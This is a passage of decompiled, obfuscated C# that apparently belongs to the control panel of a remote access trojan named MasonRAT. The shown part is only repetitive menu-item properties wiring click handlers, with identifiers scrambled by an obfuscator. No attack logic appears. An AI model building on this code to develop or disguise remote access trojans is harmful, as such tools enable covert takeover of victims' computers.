  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Fـ\u060Bــﻋ\u0609\u0608ڙ\u060Dڜڞۧڙ\u060A
  {
    get => this.\u2694️MasonRAT\u270Cــــڙـْـ\u060C\u060D\u0609ټـحٸ̍ــ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Eـڙط\u0608ڝ\u0020\u060A\u060Dﯧ\u060Cـۧــ\u060Aــ\u060A\u060A);
      ToolStripMenuItem ratــــڙـْـټـحٸ̍ــ1 = this.\u2694️MasonRAT\u270Cــــڙـْـ\u060C\u060D\u0609ټـحٸ̍ــ;
      if (ratــــڙـْـټـحٸ̍ــ1 != null)
        ratــــڙـْـټـحٸ̍ــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cــــڙـْـ\u060C\u060D\u0609ټـحٸ̍ــ = value;
      ToolStripMenuItem ratــــڙـْـټـحٸ̍ــ2 = this.\u2694️MasonRAT\u270Cــــڙـْـ\u060C\u060D\u0609ټـحٸ̍ــ;
      if (ratــــڙـْـټـحٸ̍ــ2 == null)
        return;
      ratــــڙـْـټـحٸ̍ــ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڜ\u060E\u060Aـ\u0608\u060Cد\u060Aـى\u060F\u060Dڜـ\u060B\u060A
  {
    get
    {
      return this.\u2694️MasonRAT\u270Cـٻ\u060D\u060Fـ\u060Eٸڙ\u060Dڙ\u060Cــٻ\u060A\u060F\u060Aﻻ\u0609ـ;
    }
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cح\u060Fژـ\u060Bـ̨\u0608ۭ\u060A\u060Fـ\u0608ﮪڙـ);
      ToolStripMenuItem masonRatـٻـٸڙڙــٻﻻـ1 = this.\u2694️MasonRAT\u270Cـٻ\u060D\u060Fـ\u060Eٸڙ\u060Dڙ\u060Cــٻ\u060A\u060F\u060Aﻻ\u0609ـ;
      if (masonRatـٻـٸڙڙــٻﻻـ1 != null)
        masonRatـٻـٸڙڙــٻﻻـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـٻ\u060D\u060Fـ\u060Eٸڙ\u060Dڙ\u060Cــٻ\u060A\u060F\u060Aﻻ\u0609ـ = value;
      ToolStripMenuItem masonRatـٻـٸڙڙــٻﻻـ2 = this.\u2694️MasonRAT\u270Cـٻ\u060D\u060Fـ\u060Eٸڙ\u060Dڙ\u060Cــٻ\u060A\u060F\u060Aﻻ\u0609ـ;
      if (masonRatـٻـٸڙڙــٻﻻـ2 == null)
        return;
      masonRatـٻـٸڙڙــٻﻻـ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cگـ\u0020\u060Aـۙﻋـ\u060D\u060B\u060Aـ\u060E\u060Bڅڝئڅ\u0608
  {
    get => this.\u2694️MasonRAT\u270C\u0608ــڙ\u060Aـٸ\u060Bح\u0608ـ̨;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـﻼۚ\u0020ټـڙد\u060F\u060Bﻻـۛ);
      ToolStripMenuItem masonRatــڙـٸحـ̨1 = this.\u2694️MasonRAT\u270C\u0608ــڙ\u060Aـٸ\u060Bح\u0608ـ̨;
      if (masonRatــڙـٸحـ̨1 != null)
        masonRatــڙـٸحـ̨1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0608ــڙ\u060Aـٸ\u060Bح\u0608ـ̨ = value;
      ToolStripMenuItem masonRatــڙـٸحـ̨2 = this.\u2694️MasonRAT\u270C\u0608ــڙ\u060Aـٸ\u060Bح\u0608ـ̨;
      if (masonRatــڙـٸحـ̨2 == null)
        return;
      masonRatــڙـٸحـ̨2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cــٽڼٺﻋٺ\u0608ئـئ\u060A\u060D
  {
    get => this.\u2694️MasonRAT\u270C\u060F\u060B\u0608\u0020\u0609\u0609\u060Aٻـد;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڙب\u0608ټﻋ\u060D؁\u060Aۙڙــۏ\u060Aؤٻ\u060D\u060A\u060C);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270C\u060F\u060B\u0608\u0020\u0609\u0609\u060Aٻـد;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060F\u060B\u0608\u0020\u0609\u0609\u060Aٻـد = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270C\u060F\u060B\u0608\u0020\u0609\u0609\u060Aٻـد;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("Guna2ContextMenuStrip2")]
  internal virtual Guna2ContextMenuStrip \u2694️MasonRAT\u270C\u060B\u0020\u060Aـڙـم\u060Fۛـــۜـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Aﻻ\u060C\u0608؁\u0609\u060A\u060C\u0609ڙــ\u060Fبــ\u0609ٸۙ
  {
    get => this.\u2694️MasonRAT\u270Cٺـٻۚا\u060B\u0609ۛڙڜټۭڙ\u0608\u060Eﻋد;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cحٽڠــﻋڝ\u0608د\u060A\u060Eـۙ);
      ToolStripMenuItem ratٺـٻۚاۛڙڜټۭڙﻋد1 = this.\u2694️MasonRAT\u270Cٺـٻۚا\u060B\u0609ۛڙڜټۭڙ\u0608\u060Eﻋد;
      if (ratٺـٻۚاۛڙڜټۭڙﻋد1 != null)
        ratٺـٻۚاۛڙڜټۭڙﻋد1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cٺـٻۚا\u060B\u0609ۛڙڜټۭڙ\u0608\u060Eﻋد = value;
      ToolStripMenuItem ratٺـٻۚاۛڙڜټۭڙﻋد2 = this.\u2694️MasonRAT\u270Cٺـٻۚا\u060B\u0609ۛڙڜټۭڙ\u0608\u060Eﻋد;
      if (ratٺـٻۚاۛڙڜټۭڙﻋد2 == null)
        return;
      ratٺـٻۚاۛڙڜټۭڙﻋد2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("TabPage4")]
  internal virtual TabPage \u2694️MasonRAT\u270Cۭڙ\u060Bـۜڟْگﯧ\u060Aڙ\u060F\u060Aـؤـﻋ\u060Bۡ\u060F { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Guna2HtmlLabel2")]
  internal virtual Guna2HtmlLabel \u2694️MasonRAT\u270Cـ\u060Dدـ\u0609ڠـ\u060Aــۚ\u0020ة\u060D\u060Dژــ\u060B { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Guna2HtmlLabel5")]
  internal virtual Guna2HtmlLabel \u2694️MasonRAT\u270Cــ\u0608ټـۡ\u060A\u060B\u0020ة\u060Bּـ\u060B\u0608\u0608مٺ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Guna2HtmlLabel4")]
  internal virtual Guna2HtmlLabel \u2694️MasonRAT\u270Cـ\u060Dـ\u060Dمْ̨ۚ\u0608\u0020ڙ\u060Fــــ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Guna2HtmlLabel3")]
  internal virtual Guna2HtmlLabel \u2694️MasonRAT\u270C\u060Dۙ\u060Aڜڅٸـٺــ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـ\u060D̍\u060Bۏ\u0609ـﯧ\u060Cﻋۧ\u060F
  {
    get => this.\u2694️MasonRAT\u270C\u060B\u0608ـٺــﻋـ\u0608ڙڅـۡـﻻڙ\u0608ـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cئۭٽ\u060Dـﻋــڙ\u060A);
      ToolStripMenuItem ratـٺــﻋـڙڅـۡـﻻڙـ1 = this.\u2694️MasonRAT\u270C\u060B\u0608ـٺــﻋـ\u0608ڙڅـۡـﻻڙ\u0608ـ;
      if (ratـٺــﻋـڙڅـۡـﻻڙـ1 != null)
        ratـٺــﻋـڙڅـۡـﻻڙـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060B\u0608ـٺــﻋـ\u0608ڙڅـۡـﻻڙ\u0608ـ = value;
      ToolStripMenuItem ratـٺــﻋـڙڅـۡـﻻڙـ2 = this.\u2694️MasonRAT\u270C\u060B\u0608ـٺــﻋـ\u0608ڙڅـۡـﻻڙ\u0608ـ;
      if (ratـٺــﻋـڙڅـۡـﻻڙـ2 == null)
        return;
      ratـٺــﻋـڙڅـۡـﻻڙـ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("ToolStripMenuItem10")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u0609ٺڞءۙڛـڙ\u0020ټڙڙﻻ\u0608\u060F\u060E\u060Bـ\u060A\u0609 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Cּ\u060A\u0609ـببټ\u0609ڕڠـ
  {
    get => this.\u2694️MasonRAT\u270C\u060Bـڕٽـ\u060Bـــحﻼﯧ\u060F;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڙ\u0020ــــٸ\u060Dڣ\u0609\u0608ــ\u060C);
      ToolStripMenuItem masonRatـڕٽــــحﻼﯧ1 = this.\u2694️MasonRAT\u270C\u060Bـڕٽـ\u060Bـــحﻼﯧ\u060F;
      if (masonRatـڕٽــــحﻼﯧ1 != null)
        masonRatـڕٽــــحﻼﯧ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Bـڕٽـ\u060Bـــحﻼﯧ\u060F = value;
      ToolStripMenuItem masonRatـڕٽــــحﻼﯧ2 = this.\u2694️MasonRAT\u270C\u060Bـڕٽـ\u060Bـــحﻼﯧ\u060F;
      if (masonRatـڕٽــــحﻼﯧ2 == null)
        return;
      masonRatـڕٽــــحﻼﯧ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cــٺۙ\u060B\u060A\u060F\u0608دــ
  {
    get => this.\u2694️MasonRAT\u270Cـء\u0608ـۏٻٺڕـﮪﻻۧ\u060Eدؤــٺٽ؁;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـح\u060Fـ\u060Dـۚٺٽ\u0608\u060Cټ\u060Fـد\u060D);
      ToolStripMenuItem ـۏٻٺڕـﮪﻻۧدؤــٺٽ؁1 = this.\u2694️MasonRAT\u270Cـء\u0608ـۏٻٺڕـﮪﻻۧ\u060Eدؤــٺٽ؁;
      if (ـۏٻٺڕـﮪﻻۧدؤــٺٽ؁1 != null)
        ـۏٻٺڕـﮪﻻۧدؤــٺٽ؁1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـء\u0608ـۏٻٺڕـﮪﻻۧ\u060Eدؤــٺٽ؁ = value;
      ToolStripMenuItem ـۏٻٺڕـﮪﻻۧدؤــٺٽ؁2 = this.\u2694️MasonRAT\u270Cـء\u0608ـۏٻٺڕـﮪﻻۧ\u060Eدؤــٺٽ؁;
      if (ـۏٻٺڕـﮪﻻۧدؤــٺٽ؁2 == null)
        return;
      ـۏٻٺڕـﮪﻻۧدؤــٺٽ؁2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cٺۡ\u0020ـ\u060Bژـ\u060Bڟ\u0608
  {
    get => this.\u2694️MasonRAT\u270Cڝ\u0609ـ̨ـــٸڙح\u060Aـ\u0609\u060Bڟــۡــ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـﻋؤۧ\u0609ۙـڠۙ\u060Cـ\u0609ۭ\u0608ـﻋام);
      ToolStripMenuItem ڝـ̨ـــٸڙحـڟــۡــ1 = this.\u2694️MasonRAT\u270Cڝ\u0609ـ̨ـــٸڙح\u060Aـ\u0609\u060Bڟــۡــ;
      if (ڝـ̨ـــٸڙحـڟــۡــ1 != null)
        ڝـ̨ـــٸڙحـڟــۡــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cڝ\u0609ـ̨ـــٸڙح\u060Aـ\u0609\u060Bڟــۡــ = value;
      ToolStripMenuItem ڝـ̨ـــٸڙحـڟــۡــ2 = this.\u2694️MasonRAT\u270Cڝ\u0609ـ̨ـــٸڙح\u060Aـ\u0609\u060Bڟــۡــ;
      if (ڝـ̨ـــٸڙحـڟــۡــ2 == null)
        return;
      ڝـ̨ـــٸڙحـڟــۡــ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـﻻ\u060F\u060A\u0609ڙۭ\u0609̍ـ
  {
    get => this.\u2694️MasonRAT\u270Cؤـۚ\u060Cٺٺــ\u060Aـڙـ\u060A;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0608ﻼټټـٻڙـڜﻋ);
      ToolStripMenuItem masonRatؤـۚٺٺـــڙـ1 = this.\u2694️MasonRAT\u270Cؤـۚ\u060Cٺٺــ\u060Aـڙـ\u060A;
      if (masonRatؤـۚٺٺـــڙـ1 != null)
        masonRatؤـۚٺٺـــڙـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cؤـۚ\u060Cٺٺــ\u060Aـڙـ\u060A = value;
      ToolStripMenuItem masonRatؤـۚٺٺـــڙـ2 = this.\u2694️MasonRAT\u270Cؤـۚ\u060Cٺٺــ\u060Aـڙـ\u060A;
      if (masonRatؤـۚٺٺـــڙـ2 == null)
        return;
      masonRatؤـۚٺٺـــڙـ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cــ\u0608ـط\u060A\u0609\u0608\u060Bــٸـىــ\u060E
  {
    get => this.\u2694️MasonRAT\u270Cىﻼڕـــۚ\u060A\u0609ب;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـۭؤ̨̍\u0609ٺڛ\u060D\u060Aۚ\u0609);
      ToolStripMenuItem masonRatىﻼڕـــۚب1 = this.\u2694️MasonRAT\u270Cىﻼڕـــۚ\u060A\u0609ب;
      if (masonRatىﻼڕـــۚب1 != null)
        masonRatىﻼڕـــۚب1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cىﻼڕـــۚ\u060A\u0609ب = value;
      ToolStripMenuItem masonRatىﻼڕـــۚب2 = this.\u2694️MasonRAT\u270Cىﻼڕـــۚ\u060A\u0609ب;
      if (masonRatىﻼڕـــۚب2 == null)
        return;
      masonRatىﻼڕـــۚب2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cؤٽـۙــ\u0608؁\u060Bڙ\u060A\u060D\u060A̍ـ\u060Dڞـۡـ
  {
    get => this.\u2694️MasonRAT\u270C\u0608ﻋ\u060D\u0609ټـؤدـڝـ\u0608ـــٺ\u0609\u060A\u060Bٻ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cــڙـ\u0608\u060Bڙۭـﮪ\u060Cـ);
      ToolStripMenuItem ratﻋټـؤدـڝــــٺٻ1 = this.\u2694️MasonRAT\u270C\u0608ﻋ\u060D\u0609ټـؤدـڝـ\u0608ـــٺ\u0609\u060A\u060Bٻ;
      if (ratﻋټـؤدـڝــــٺٻ1 != null)
        ratﻋټـؤدـڝــــٺٻ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0608ﻋ\u060D\u0609ټـؤدـڝـ\u0608ـــٺ\u0609\u060A\u060Bٻ = value;
      ToolStripMenuItem ratﻋټـؤدـڝــــٺٻ2 = this.\u2694️MasonRAT\u270C\u0608ﻋ\u060D\u0609ټـؤدـڝـ\u0608ـــٺ\u0609\u060A\u060Bٻ;
      if (ratﻋټـؤدـڝــــٺٻ2 == null)
        return;
      ratﻋټـؤدـڝــــٺٻ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("ToolStripMenuItem37")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060A\u060Eﻻ\u0609ـڙۛـ\u060F\u060A { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cد\u060Dۙــ\u0609\u060Aــ\u0020\u060Aـ\u0609ּ\u060Aﯧــ
  {
    get => this.\u2694️MasonRAT\u270C\u060A\u060C\u060B\u0608ــــ\u060Cڠۧ\u060Bڜ\u060F\u0609ـٸ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Fٺـۡـڙۜ\u060C\u060Fـح\u0609ـۙ\u0608ٸۛ\u060Aـ);
      ToolStripMenuItem masonRatــــڠۧڜـٸ1 = this.\u2694️MasonRAT\u270C\u060A\u060C\u060B\u0608ــــ\u060Cڠۧ\u060Bڜ\u060F\u0609ـٸ;
      if (masonRatــــڠۧڜـٸ1 != null)
        masonRatــــڠۧڜـٸ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060A\u060C\u060B\u0608ــــ\u060Cڠۧ\u060Bڜ\u060F\u0609ـٸ = value;
      ToolStripMenuItem masonRatــــڠۧڜـٸ2 = this.\u2694️MasonRAT\u270C\u060A\u060C\u060B\u0608ــــ\u060Cڠۧ\u060Bڜ\u060F\u0609ـٸ;
      if (masonRatــــڠۧڜـٸ2 == null)
        return;
      masonRatــــڠۧڜـٸ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cﻋ\u060Fـٺح\u0609ﻻڼۛـ\u060D\u060Dـڙ
  {
    get => this.\u2694️MasonRAT\u270C\u060A\u060C\u060Cﻻ\u060Cۏ\u060Dڙ\u0020ژــڟۚـﻋ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڙ\u060A\u060Aىڙــــ\u0609ڙ\u060Bڛب);
      ToolStripMenuItem masonRatﻻۏڙژــڟۚـﻋ1 = this.\u2694️MasonRAT\u270C\u060A\u060C\u060Cﻻ\u060Cۏ\u060Dڙ\u0020ژــڟۚـﻋ;
      if (masonRatﻻۏڙژــڟۚـﻋ1 != null)
        masonRatﻻۏڙژــڟۚـﻋ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060A\u060C\u060Cﻻ\u060Cۏ\u060Dڙ\u0020ژــڟۚـﻋ = value;
      ToolStripMenuItem masonRatﻻۏڙژــڟۚـﻋ2 = this.\u2694️MasonRAT\u270C\u060A\u060C\u060Cﻻ\u060Cۏ\u060Dڙ\u0020ژــڟۚـﻋ;
      if (masonRatﻻۏڙژــڟۚـﻋ2 == null)
        return;
      masonRatﻻۏڙژــڟۚـﻋ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـ\u0609ؤ\u060Cٺڝۡڙــ\u060F
  {
    get => this.\u2694️MasonRAT\u270Cـب\u060Aـؤڛڣ\u060Aژـؤڝ\u0609\u0609ئ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڼ\u060D\u0609\u060Dءـ\u0609̍ـ\u0608ڙٺ\u060A̍);
      ToolStripMenuItem masonRatـبـؤڛڣژـؤڝئ1 = this.\u2694️MasonRAT\u270Cـب\u060Aـؤڛڣ\u060Aژـؤڝ\u0609\u0609ئ;
      if (masonRatـبـؤڛڣژـؤڝئ1 != null)
        masonRatـبـؤڛڣژـؤڝئ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـب\u060Aـؤڛڣ\u060Aژـؤڝ\u0609\u0609ئ = value;
      ToolStripMenuItem masonRatـبـؤڛڣژـؤڝئ2 = this.\u2694️MasonRAT\u270Cـب\u060Aـؤڛڣ\u060Aژـؤڝ\u0609\u0609ئ;
      if (masonRatـبـؤڛڣژـؤڝئ2 == null)
        return;
      masonRatـبـؤڛڣژـؤڝئ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("ToolStripMenuItem42")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـڙـۚــۙۡۡڙڠ\u060A\u060Fۭ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Aּ\u060Aۙـۛټڙٺﯧـﻋ\u060C\u0609
  {
    get => this.\u2694️MasonRAT\u270Cڙ\u060A\u060Dڜــۙ\u060Aۡٻ\u060Cـۧىــ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـ\u0608\u0609\u060D\u0608ـ\u0609ـڙـ\u0608ۡ);
      ToolStripMenuItem masonRatڙڜــۙۡٻـۧىــ1 = this.\u2694️MasonRAT\u270Cڙ\u060A\u060Dڜــۙ\u060Aۡٻ\u060Cـۧىــ;
      if (masonRatڙڜــۙۡٻـۧىــ1 != null)
        masonRatڙڜــۙۡٻـۧىــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cڙ\u060A\u060Dڜــۙ\u060Aۡٻ\u060Cـۧىــ = value;
      ToolStripMenuItem masonRatڙڜــۙۡٻـۧىــ2 = this.\u2694️MasonRAT\u270Cڙ\u060A\u060Dڜــۙ\u060Aۡٻ\u060Cـۧىــ;
      if (masonRatڙڜــۙۡٻـۧىــ2 == null)
        return;
      masonRatڙڜــۙۡٻـۧىــ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u0609ـٺۛ\u0609ـڝ\u0609\u060Cټٺ\u0608ــۭ\u060E\u0609ڝٺ\u060F
  {
    get => this.\u2694️MasonRAT\u270C\u060Cـ\u0608ـ\u060Eڣﻋ\u060Aـ\u060Aۡ\u060E\u060Aـ\u060Aـــ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cټمــدـ\u060Dــــٽ);
      ToolStripMenuItem masonRatــڣﻋـۡــــ1 = this.\u2694️MasonRAT\u270C\u060Cـ\u0608ـ\u060Eڣﻋ\u060Aـ\u060Aۡ\u060E\u060Aـ\u060Aـــ;
      if (masonRatــڣﻋـۡــــ1 != null)
        masonRatــڣﻋـۡــــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Cـ\u0608ـ\u060Eڣﻋ\u060Aـ\u060Aۡ\u060E\u060Aـ\u060Aـــ = value;
      ToolStripMenuItem masonRatــڣﻋـۡــــ2 = this.\u2694️MasonRAT\u270C\u060Cـ\u0608ـ\u060Eڣﻋ\u060Aـ\u060Aۡ\u060E\u060Aـ\u060Aـــ;
      if (masonRatــڣﻋـۡــــ2 == null)
        return;
      masonRatــڣﻋـۡــــ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Aۏﯧـؤ\u060A\u060D\u0608\u0609\u0609ۙ\u060D
  {
    get => this.\u2694️MasonRAT\u270Cـڙ\u060A\u060Fبﻻ\u0609ـ\u060D̨\u060Aــ\u060Dد\u0020ْ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cټـ̍\u0609\u060Aـ\u060Aـټۡــڠـ\u060Eؤـ);
      ToolStripMenuItem masonRatـڙبﻻـ̨ــدْ1 = this.\u2694️MasonRAT\u270Cـڙ\u060A\u060Fبﻻ\u0609ـ\u060D̨\u060Aــ\u060Dد\u0020ْ;
      if (masonRatـڙبﻻـ̨ــدْ1 != null)
        masonRatـڙبﻻـ̨ــدْ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـڙ\u060A\u060Fبﻻ\u0609ـ\u060D̨\u060Aــ\u060Dد\u0020ْ = value;
      ToolStripMenuItem masonRatـڙبﻻـ̨ــدْ2 = this.\u2694️MasonRAT\u270Cـڙ\u060A\u060Fبﻻ\u0609ـ\u060D̨\u060Aــ\u060Dد\u0020ْ;
      if (masonRatـڙبﻻـ̨ــدْ2 == null)
        return;
      masonRatـڙبﻻـ̨ــدْ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cּ\u0020\u060Cڠۧ\u0609ٻـٻﻻﯧـۨٽڼـﻋ\u0608ٺ
  {
    get => this.\u2694️MasonRAT\u270C\u0609\u0609ىـٽﻋـژ\u060Bڠ\u060B̍ڦ\u060A;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0608ــٸٽـ\u0020ــ\u060Aـ);
      ToolStripMenuItem masonRatىـٽﻋـژڠ̍ڦ1 = this.\u2694️MasonRAT\u270C\u0609\u0609ىـٽﻋـژ\u060Bڠ\u060B̍ڦ\u060A;
      if (masonRatىـٽﻋـژڠ̍ڦ1 != null)
        masonRatىـٽﻋـژڠ̍ڦ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0609\u0609ىـٽﻋـژ\u060Bڠ\u060B̍ڦ\u060A = value;
      ToolStripMenuItem masonRatىـٽﻋـژڠ̍ڦ2 = this.\u2694️MasonRAT\u270C\u0609\u0609ىـٽﻋـژ\u060Bڠ\u060B̍ڦ\u060A;
      if (masonRatىـٽﻋـژڠ̍ڦ2 == null)
        return;
      masonRatىـٽﻋـژڠ̍ڦ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cۛڙ؁ـ\u060Aـٽ\u060D\u060Fٺٺٸ\u0609ـڙح\u060D
  {
    get => this.\u2694️MasonRAT\u270C\u0609\u0608ــڦﮪـ\u060Aـ\u060Bـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cۛ̍ڙڛـٻـ\u0609ـد\u060Cـ\u060Bد\u060E);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270C\u0609\u0608ــڦﮪـ\u060Aـ\u060Bـ;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0609\u0608ــڦﮪـ\u060Aـ\u060Bـ = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270C\u0609\u0608ــڦﮪـ\u060Aـ\u060Bـ;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـ\u060Bــ\u060C\u060B\u060B\u060A\u0609\u060Dڕحـ\u0609ڛ\u0608
  {
    get => this.\u2694️MasonRAT\u270C\u0020ڙ\u060Cـﯧء\u0609ـڼ\u060Aـ\u060Cـټڙ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cۡۛ\u060Fئڙ\u0608ٽ\u0020\u0609ء\u0608ـ\u060Eۨ);
      ToolStripMenuItem masonRatڙـﯧءـڼــټڙ1 = this.\u2694️MasonRAT\u270C\u0020ڙ\u060Cـﯧء\u0609ـڼ\u060Aـ\u060Cـټڙ;
      if (masonRatڙـﯧءـڼــټڙ1 != null)
        masonRatڙـﯧءـڼــټڙ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0020ڙ\u060Cـﯧء\u0609ـڼ\u060Aـ\u060Cـټڙ = value;
      ToolStripMenuItem masonRatڙـﯧءـڼــټڙ2 = this.\u2694️MasonRAT\u270C\u0020ڙ\u060Cـﯧء\u0609ـڼ\u060Aـ\u060Cـټڙ;
      if (masonRatڙـﯧءـڼــټڙ2 == null)
        return;
      masonRatڙـﯧءـڼــټڙ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـ\u060Bـ\u0609\u060Bۧـــ\u0020
  {
    get => this.\u2694️MasonRAT\u270Cـط̍څ\u060Cٽـ\u060B\u0609\u060A\u060Aڙحاٺْ\u060C\u060A;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cﻻـڣ\u0608ۏڇ\u060D\u060D\u060Aــۧبـ\u0609ٸڛڠﮪ);
      ToolStripMenuItem masonRatـط̍څٽـڙحاٺْ1 = this.\u2694️MasonRAT\u270Cـط̍څ\u060Cٽـ\u060B\u0609\u060A\u060Aڙحاٺْ\u060C\u060A;
      if (masonRatـط̍څٽـڙحاٺْ1 != null)
        masonRatـط̍څٽـڙحاٺْ1.Click -= eventHandler;
